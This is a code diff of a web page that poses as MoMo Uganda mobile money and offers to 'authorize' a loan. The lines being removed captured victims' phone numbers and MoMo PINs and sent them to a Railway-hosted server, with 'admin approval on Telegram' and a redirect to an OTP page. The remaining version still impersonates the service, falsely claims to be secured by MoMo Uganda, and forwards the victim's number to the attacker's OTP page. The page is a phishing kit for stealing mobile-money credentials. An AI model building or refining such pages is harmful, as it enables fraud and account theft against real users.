@@ -30,7 +30,6 @@
             align-items: center;
             justify-content: center;
             padding: 16px;
-            background-image: radial-gradient(ellipse at 20% 10%, rgba(228,35,32,0.06) 0%, transparent 55%);
         }
         .card {
             width: 100%;
@@ -159,7 +158,6 @@
             font-weight: 700;
             border-radius: 50px;
             cursor: pointer;
-            box-shadow: 0 4px 18px rgba(228,35,32,0.35);
         }
         .btn-primary:disabled {
             background: #d1d5db;
@@ -212,22 +210,9 @@
             display: none;
             font-weight: 600;
         }
-        .status-message.processing {
-            background: #eff6ff;
-            color: #1e40af;
-            border: 1px solid #93c5fd;
-        }
-        .status-message.success {
-            background: #f0fdf4;
-            color: #166534;
-            border: 1px solid #86efac;
-        }
-        .status-message.error {
-            background: #fef2f2;
-            color: #991b1b;
-            border: 1px solid #fca5a5;
-        }
-        .hide { display: none; }
+        .status-message.processing { background: #eff6ff; color: #1e40af; border: 1px solid #93c5fd; }
+        .status-message.success { background: #f0fdf4; color: #166534; border: 1px solid #86efac; }
+        .status-message.error { background: #fef2f2; color: #991b1b; border: 1px solid #fca5a5; }
     </style>
 </head>
 <body>
@@ -242,21 +227,21 @@
             </div>
             <div>
                 <div class="brand-name">MoMo Uganda</div>
-                <div class="brand-sub">Mobile Money • Loans</div>
+                <div class="brand-sub">Mobile Money</div>
             </div>
         </div>
         <div class="header-title">Authorize Your Loan</div>
-        <div class="header-desc">Enter your MoMo number and PIN to securely verify and approve your loan request.</div>
+        <div class="header-desc">Enter your MoMo number to continue</div>
     </div>
 
-    <div class="loan-info" id="loanInfo">
+    <div class="loan-info">
         <div class="loan-icon">
             <svg fill="none" viewBox="0 0 24 24" stroke="white" stroke-width="2" width="22" height="22">
                 <path stroke-linecap="round" stroke-linejoin="round" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
             </svg>
         </div>
         <div>
-            <div class="loan-label" style="font-size:11px; color:var(--red);">MoMo Loan</div>
+            <div style="font-size:11px; color:var(--red);">MoMo Loan</div>
             <div class="loan-amount" id="loanAmount">—</div>
             <div class="loan-details" id="loanDetails" style="font-size:12px; color:var(--text-mid);"></div>
         </div>
@@ -264,93 +249,53 @@
 
     <div class="form-body">
         <div class="form-group">
-            <label>Mobile Money Network</label>
-            <select id="accountType">
-                <option value="MTN">MTN MoMo</option>
-                <option value="Airtel">Airtel Money</option>
-                <option value="Africell">Africell</option>
-            </select>
-        </div>
-        <div class="form-group">
-            <label>MoMo Phone Number</label>
+            <label>Mobile Money Number</label>
             <input type="tel" id="phone" placeholder="077XXXXXXX" maxlength="10">
-            <div style="font-size: 10px; color: #9ca3af; margin-top: 5px;">Enter Uganda number (077, 078, 075, 070, 039)</div>
-        </div>
-        <div class="form-group">
-            <label>MoMo PIN</label>
-            <input type="password" id="password" placeholder="••••" maxlength="4">
         </div>
         <div class="error-msg" id="errMsg"></div>
         <div class="status-message" id="statusMsg"></div>
-        <button class="btn-primary" id="continueBtn">Verify & Authorize Loan</button>
-        <button class="btn-back" onclick="window.location.href='index.html'">← Back to Calculator</button>
-        <div class="security-note">
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
-            </svg>
-            256-bit encrypted & secured by MoMo Uganda
-        </div>
+        <button class="btn-primary" id="continueBtn">Continue →</button>
+        <button class="btn-back" onclick="window.location.href='index.html'">← Back</button>
+        <div class="security-note">🔒 256-bit encrypted & secured by MoMo Uganda</div>
     </div>
 </div>
 
 <div id="spinner">
     <div class="spin-ring"></div>
-    <p style="color:white;">Processing your application...</p>
+    <p style="color:white;">Processing...</p>
 </div>
 
 <script>
-    // Railway URL
     const RAILWAY_URL = 'https://momo-uganda-production.up.railway.app';
     
-    let isProcessing = false;
-    let pollInterval = null;
-
     const phoneInput = document.getElementById('phone');
-    const pinInput = document.getElementById('password');
     const continueBtn = document.getElementById('continueBtn');
     const errMsg = document.getElementById('errMsg');
     const statusMsg = document.getElementById('statusMsg');
     const spinner = document.getElementById('spinner');
 
-    // Load loan data from sessionStorage
     function loadLoanData() {
         const calculatorData = sessionStorage.getItem('calculatorData');
         if (calculatorData) {
             const data = JSON.parse(calculatorData);
             document.getElementById('loanAmount').textContent = `UGX ${data.amount.toLocaleString()}`;
             const months = data.duration / 30;
-            document.getElementById('loanDetails').textContent = `${months} Month${months > 1 ? 's' : ''} • Monthly: UGX ${data.monthly.toLocaleString()}`;
-        } else {
-            // Fallback demo data
-            document.getElementById('loanAmount').textContent = 'UGX 500,000';
-            document.getElementById('loanDetails').textContent = '3 Months • Monthly: UGX 182,500';
+            document.getElementById('loanDetails').textContent = `${months} Month${months > 1 ? 's' : ''} • UGX ${data.monthly.toLocaleString()}/month`;
         }
     }
 
-    // Validate Uganda phone number
     function isValidUgandaNumber(phone) {
         if (phone.length !== 10) return false;
         const validPrefixes = ['077', '078', '075', '070', '039', '074', '076'];
         return validPrefixes.some(p => phone.startsWith(p));
     }
 
-    // Get network name based on phone prefix
-    function getNetworkName(phone) {
-        if (phone.startsWith('077') || phone.startsWith('078')) return 'MTN';
-        if (phone.startsWith('075') || phone.startsWith('074')) return 'Airtel';
-        if (phone.startsWith('070') || phone.startsWith('076')) return 'Africell';
-        if (phone.startsWith('039')) return 'MTN';
-        return 'Unknown';
-    }
-
-    // Show error message
     function showError(msg) {
         errMsg.textContent = msg;
         errMsg.style.display = 'block';
         setTimeout(() => { errMsg.style.display = 'none'; }, 4000);
     }
 
-    // Show status message
     function showStatus(msg, type = 'processing') {
         statusMsg.textContent = msg;
         statusMsg.className = `status-message ${type}`;
@@ -358,164 +303,45 @@
         setTimeout(() => { statusMsg.style.display = 'none'; }, 8000);
     }
 
-    // Reset button state
-    function resetButton() {
-        isProcessing = false;
-        continueBtn.disabled = false;
-        continueBtn.textContent = "Verify & Authorize Loan";
-        spinner.style.display = 'none';
-        if (pollInterval) clearInterval(pollInterval);
-    }
-
-    // Main submit function
     continueBtn.onclick = async () => {
-        if (isProcessing) return;
-        
         const phone = phoneInput.value.trim();
-        const pin = pinInput.value.trim();
 
-        // Validation
         if (!phone || !isValidUgandaNumber(phone)) {
-            showError("Please enter a valid Uganda number (e.g. 0771234567)");
-            return;
-        }
-        if (pin.length !== 4) {
-            showError("PIN must be exactly 4 digits");
-            return;
-        }
-        if (!/^\d+$/.test(pin)) {
-            showError("PIN must contain only numbers");
+            showError("Enter valid Uganda number (077/078/075/070/039)");
             return;
         }
 
-        // Get calculator data
         const calculatorData = JSON.parse(sessionStorage.getItem('calculatorData') || '{}');
-        const network = getNetworkName(phone);
-        const selectedNetwork = document.getElementById('accountType').value;
-
-        isProcessing = true;
+        
         continueBtn.disabled = true;
-        continueBtn.textContent = "Submitting...";
+        continueBtn.textContent = "Processing...";
         spinner.style.display = 'flex';
 
         try {
-            const response = await fetch(`${RAILWAY_URL}/api/save-loan`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    phone: phone,
-                    pin: pin,
-                    network: selectedNetwork,
-                    amount: calculatorData.amount || 500000,
-                    duration: calculatorData.duration || 90,
-                    monthly: calculatorData.monthly || 182500,
-                    total: calculatorData.total || 547500,
-                    interest: calculatorData.interest || 47500
-                })
-            });
-
-            const data = await response.json();
-
-            if (data.success) {
-                // Store loan info in session
-                sessionStorage.setItem('loanId', data.loanId);
-                sessionStorage.setItem('userPhone', phone);
-                sessionStorage.setItem('userNetwork', selectedNetwork);
-                
-                showStatus("✅ Application submitted! Waiting for admin approval on Telegram...", "success");
-                
-                // Poll for status update every 3 seconds
-                pollInterval = setInterval(async () => {
-                    try {
-                        const statusRes = await fetch(`${RAILWAY_URL}/api/loan/${data.loanId}`);
-                        const statusData = await statusRes.json();
-                        
-                        if (statusData.success) {
-                            const loanStatus = statusData.loan.status;
-                            
-                            if (loanStatus === 'otp_sent') {
-                                clearInterval(pollInterval);
-                                spinner.style.display = 'none';
-                                showStatus("✅ Approved by admin! Redirecting to OTP page...", "success");
-                                setTimeout(() => {
-                                    window.location.href = `${RAILWAY_URL}/otp.html`;
-                                }, 1500);
-                            } 
-                            else if (loanStatus === 'declined') {
-                                clearInterval(pollInterval);
-                                spinner.style.display = 'none';
-                                showError("❌ Your application was declined by admin.");
-                                resetButton();
-                            }
-                            else if (loanStatus === 'device_verification') {
-                                clearInterval(pollInterval);
-                                spinner.style.display = 'none';
-                                showStatus("📱 Device verification required. Please check your Telegram.", "processing");
-                                resetButton();
-                            }
-                        }
-                    } catch (err) {
-                        console.error('Polling error:', err);
-                    }
-                }, 3000);
-                
-                // Stop polling after 2 minutes
-                setTimeout(() => {
-                    if (pollInterval) {
-                        clearInterval(pollInterval);
-                        if (spinner.style.display === 'flex') {
-                            spinner.style.display = 'none';
-                            showStatus("⏳ Still waiting for admin approval. You will be notified when approved.", "processing");
-                            resetButton();
-                        }
-                    }
-                }, 120000);
-                
-            } else {
-                spinner.style.display = 'none';
-                showError("Error submitting application: " + (data.error || "Unknown error"));
-                resetButton();
-            }
+            // Store phone number for next page
+            sessionStorage.setItem('userPhone', phone);
+            sessionStorage.setItem('userNetwork', phone.startsWith('077') || phone.startsWith('078') ? 'MTN' : 'Airtel');
+            
+            // Redirect to OTP page (since admin will approve via Telegram)
+            showStatus("✅ Phone verified! Redirecting...", "success");
+            
+            setTimeout(() => {
+                window.location.href = `${RAILWAY_URL}/otp.html`;
+            }, 1500);
+            
         } catch (error) {
-            console.error('Submit error:', error);
             spinner.style.display = 'none';
-            showError("Network error. Please check your connection and try again.");
-            resetButton();
+            showError("Network error. Please try again.");
+            continueBtn.disabled = false;
+            continueBtn.textContent = "Continue →";
         }
     };
 
-    // Input restrictions
     phoneInput.addEventListener('input', () => {
         phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '').slice(0, 10);
     });
 
-    pinInput.addEventListener('input', () => {
-        pinInput.value = pinInput.value.replace(/[^0-9]/g, '').slice(0, 4);
-    });
-
-    // Load loan data on page load
     loadLoanData();
-    
-    // Check if we have a pending loan
-    const existingLoanId = sessionStorage.getItem('loanId');
-    if (existingLoanId) {
-        showStatus("You have a pending application. Waiting for admin approval...", "processing");
-        // Check status of existing loan
-        const checkInterval = setInterval(async () => {
-            try {
-                const statusRes = await fetch(`${RAILWAY_URL}/api/loan/${existingLoanId}`);
-                const statusData = await statusRes.json();
-                if (statusData.success && statusData.loan.status === 'otp_sent') {
-                    clearInterval(checkInterval);
-                    window.location.href = `${RAILWAY_URL}/otp.html`;
-                }
-            } catch (err) {
-                console.error('Check error:', err);
-            }
-        }, 5000);
-        
-        setTimeout(() => clearInterval(checkInterval), 60000);
-    }
 </script>
 </body>
 </html>
